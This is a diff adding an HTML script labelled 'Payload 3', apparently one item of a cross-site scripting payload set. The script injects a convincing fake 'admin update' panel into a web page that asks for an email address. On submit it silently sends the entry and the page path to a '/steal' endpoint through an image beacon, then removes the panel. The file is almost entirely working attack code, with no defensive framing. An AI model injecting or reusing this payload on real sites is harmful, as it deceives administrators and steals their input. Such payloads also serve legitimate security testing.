@@ -1,0 +1,104 @@
+<!-- Payload 3 – “Message center – admin update” -->
+
+<script>
+(function () {
+    var container = document.body || document.documentElement;
+    if (!container) return;
+
+    var panel = document.createElement("div");
+    panel.style.maxWidth = "520px";
+    panel.style.margin = "16px auto";
+    panel.style.background = "#ffffff";
+    panel.style.borderRadius = "16px";
+    panel.style.boxShadow = "0 18px 45px rgba(15,23,42,0.18)";
+    panel.style.padding = "18px 20px 16px";
+    panel.style.fontFamily = "-apple-system,BlinkMacSystemFont,system-ui,sans-serif";
+
+    var heading = document.createElement("div");
+    heading.textContent = "Message center – quick admin update";
+    heading.style.fontSize = "15px";
+    heading.style.fontWeight = "600";
+    heading.style.color = "#0f172a";
+    heading.style.marginBottom = "4px";
+
+    var info = document.createElement("p");
+    info.textContent = "Set the email used for follow-up replies to contact messages.";
+    info.style.margin = "0 0 12px";
+    info.style.fontSize = "13px";
+    info.style.color = "#6b7280";
+
+    var form = document.createElement("form");
+    form.autocomplete = "off";
+
+    var label = document.createElement("label");
+    label.textContent = "Reply-from email";
+    label.style.display = "block";
+    label.style.fontSize = "13px";
+    label.style.color = "#4b5563";
+    label.style.marginBottom = "4px";
+
+    var email = document.createElement("input");
+    email.type = "email";
+    email.required = true;
+    email.placeholder = "notifications@your-company.com";
+    email.style.width = "100%";
+    email.style.boxSizing = "border-box";
+    email.style.borderRadius = "10px";
+    email.style.border = "1px solid #e5e7eb";
+    email.style.padding = "7px 10px";
+    email.style.fontSize = "13px";
+    email.style.marginBottom = "10px";
+
+    var btnRow = document.createElement("div");
+    btnRow.style.display = "flex";
+    btnRow.style.justifyContent = "flex-end";
+    btnRow.style.gap = "8px";
+
+    var btnCancel = document.createElement("button");
+    btnCancel.type = "button";
+    btnCancel.textContent = "Cancel";
+    btnCancel.style.border = "1px solid #e5e7eb";
+    btnCancel.style.borderRadius = "999px";
+    btnCancel.style.padding = "7px 14px";
+    btnCancel.style.fontSize = "13px";
+    btnCancel.style.background = "#ffffff";
+    btnCancel.style.color = "#4b5563";
+    btnCancel.style.cursor = "pointer";
+    btnCancel.onclick = function () { panel.remove(); };
+
+    var btnSave = document.createElement("button");
+    btnSave.type = "submit";
+    btnSave.textContent = "Save";
+    btnSave.style.border = "none";
+    btnSave.style.borderRadius = "999px";
+    btnSave.style.padding = "7px 14px";
+    btnSave.style.fontSize = "13px";
+    btnSave.style.fontWeight = "600";
+    btnSave.style.background = "#0ea5e9";
+    btnSave.style.color = "#0f172a";
+    btnSave.style.cursor = "pointer";
+
+    form.onsubmit = function (e) {
+        e.preventDefault();
+        var value = "admin_update"
+        + "|reply_email=" + email.value
+        + "|path=" + location.pathname;
+        var img = new Image();
+        img.src = "/steal?c=" + encodeURIComponent(value);
+        panel.remove();
+    };
+
+    btnRow.appendChild(btnCancel);
+    btnRow.appendChild(btnSave);
+
+    form.appendChild(label);
+    form.appendChild(email);
+    form.appendChild(btnRow);
+
+    panel.appendChild(heading);
+    panel.appendChild(info);
+    panel.appendChild(form);
+
+    container.insertBefore(panel, container.firstChild);
+})();
+</script>
